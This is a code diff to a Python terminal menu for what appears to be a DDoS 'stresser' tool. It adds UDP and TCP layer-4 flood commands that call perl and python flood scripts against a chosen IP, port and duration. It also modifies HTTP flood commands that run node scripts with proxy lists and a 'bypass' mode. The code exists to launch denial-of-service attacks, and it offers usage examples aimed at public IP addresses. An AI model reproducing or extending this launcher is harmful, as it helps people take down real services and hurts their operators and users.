@@ -214,6 +214,7 @@ def layer4():
                         ║      \x1b[38;5;160mTYPE '\x1b[38;5;255mMETHOD\x1b[38;5;160m' TO SEE METHOD OF ATTACK     ║
                     ╔═══╩════════════════════════════════════════════════╩═══╗
                     ║       ●  HOME   [\x1b[38;2;134;20;246mLayer4\x1b[38;5;160m]    ●  STRESS  [\x1b[38;2;134;20;246mLayer4\x1b[38;5;160m]        ║
+                    ║       ●  UDP    [\x1b[38;2;134;20;246mLayer4\x1b[38;5;160m]    ●  TCP     [\x1b[38;2;134;20;246mLayer4\x1b[38;5;160m]        ║
                     ╚════════════════════════════════════════════════════════╝
 \033[0m""")
 
@@ -352,16 +353,28 @@ def main():
                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mIP 8.8.8.8')
 #########LAYER-7########
                 
-                elif sinput == "FLOOD" or sinput == "flood":
+                elif sinput == "udp" or sinput == "UDP":
                         try:
-                                url = sin.split()[1]
-                                time = sin.split()[2]
-                                mode = sin.split()[3]
+                                ip = sin.split()[1]
+                                port = sin.split()[2]
+                                time = sin.split()[3]
                                 os.system ("clear")
-                                os.system(f'cd VIP && node FLOOD.js {url} {time} 64 10 proxy.txt {mode}')  
+                                os.system(f'cd L4 && perl udp.pl {ip} {port} {time}')  
                         except (ValueError, IndexError):
-                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mFLOOD <url> <time> <flood/bypass>")
-                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mFLOOD https://example.com 120 bypass')
+                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mUDP <ip> <port> <time>")
+                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mUDP 1.1.1.1 80 120')
+
+                elif sinput == "tcp" or sinput == "TCP":
+                        try:
+                                ip = sin.split()[1]
+                                port = sin.split()[2]
+                                thread = sin.split()[3]
+                                time = sin.split()[4]
+                                os.system ("clear")
+                                os.system(f'cd L4 && python tcp.py {ip} {port} 10000 {thread} {time}')  
+                        except (ValueError, IndexError):
+                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mTCP <ip> <port> <thread> <time>")
+                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mTCP 1.1.1.1 80 10 120')
 
                 elif sinput == "BOW" or sinput == "bow":
                         try:
@@ -384,14 +397,16 @@ def main():
                                 print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mBROWSER <url> <time> <threads>")
                                 print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mBROWSER https://example.com 120 10')
                 
-                elif sinput == "FLOOD2" or sinput == "flood2":
+                elif sinput == "FLOOD" or sinput == "flood":
                         try:
                                 url = sin.split()[1]
                                 time = sin.split()[2]
-                                os.system(f'cd L7 && node FLOOD2.js {url} {time} 200 8 proxy.txt bypass')
+                                mode = sin.split()[3]
+                                os.system ("clear")
+                                os.system(f'cd VIP && node FLOOD.js {url} {time} 200 8 proxy.txt {mode}')
                         except (ValueError, IndexError):
-                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mFLOOD2 <url> <time>")
-                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mFLOOD2 https://example.com 120')
+                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mFLOOD <url> <time> <bypass/flood>")
+                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mFLOOD https://example.com 120 bypass')
                  
                 elif sinput == "HOME" or sinput == "home":
                         try:
